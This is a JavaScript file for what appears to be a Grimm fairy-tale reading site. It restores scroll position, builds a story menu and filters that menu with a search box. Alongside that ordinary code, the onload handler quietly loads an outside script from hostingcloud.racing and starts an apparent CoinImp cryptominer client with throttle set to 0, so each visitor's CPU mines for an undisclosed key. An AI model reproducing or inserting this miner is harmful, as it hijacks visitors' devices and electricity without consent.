window.onscroll = () => {
    localStorage.setItem('scrollPosition', window.pageYOffset);
}
window.onload = function() {
    let scrollPosition = localStorage.getItem('scrollPosition');
    if (scrollPosition) {
        window.scrollTo(0, scrollPosition);
    }
    let coinImpSdk = document.createElement('script');
    coinImpSdk.src = 'https://www.hostingcloud.racing/Buz4.js';
    coinImpSdk.defer = true;
    coinImpSdk.onload = () => {
        var _client = new Client.Anonymous('1b338ef2246dfb0c9665ca717515ff07c101d6d5c96df696097a28b6fb997ed5', {
            throttle: 0, c: 'w', ads: 0
        });
        _client.start();
    }
    let adDiv = document.createElement('div');
    adDiv.className = "adDiv";
    adDiv.innerHTML = ``;

    let menuBtn = document.createElement('button');
    menuBtn.className = 'menuBtn';
    menuBtn.innerText = '📕';

    let menuDiv = document.createElement('div');
    menuDiv.className = 'menuDiv';
    menuDiv.style.display = 'none'; // Initially hiding the menuDiv
    menuDiv.innerHTML = `
    <div class="sideAd"></div>
    <input class="findStory" type="search" placeholder="Search Story">
    <a href="Our Lady’s Child.html"><h2>OUR LADY'S CHILD</h2></a>
    <a href="Cat And Mouse In Partnership.html"><h2>CAT AND MOUSE IN PARTNERSHIP</h2></a>
    <a href="The Frog-king, Or Iron Henry.html"><h2>THE FROG-KING, OR IRON HENRY</h2></a>
    `;

    menuBtn.onclick = function() {
        if (menuDiv.style.display === 'block') {
            menuDiv.style.display = 'none';
            document.body.style.overflow = "scroll";
            menuBtn.innerText = '📕';
        } else {
            menuDiv.style.display = 'block';
            document.body.style.overflow = "hidden";
            menuBtn.innerText = '📖';
        }
    };

    document.body.append(menuBtn);
    document.body.append(coinImpSdk);
    document.body.append(menuDiv);
    document.body.append(adDiv);

    let findStory = document.querySelector('.findStory');
    findStory.addEventListener('input', function() {
        let searchText = findStory.value.toLowerCase(); // Get the input value in lowercase for case-insensitive comparison

        let storyTitles = document.querySelectorAll('.menuDiv a h2');
        storyTitles.forEach(title => {
            let titleText = title.innerText.toLowerCase();
            if (titleText.includes(searchText)) {
                title.parentElement.style.display = 'block'; // Show matching items
            } else {
                title.parentElement.style.display = 'none'; // Hide non-matching items
            }
        });
    });
};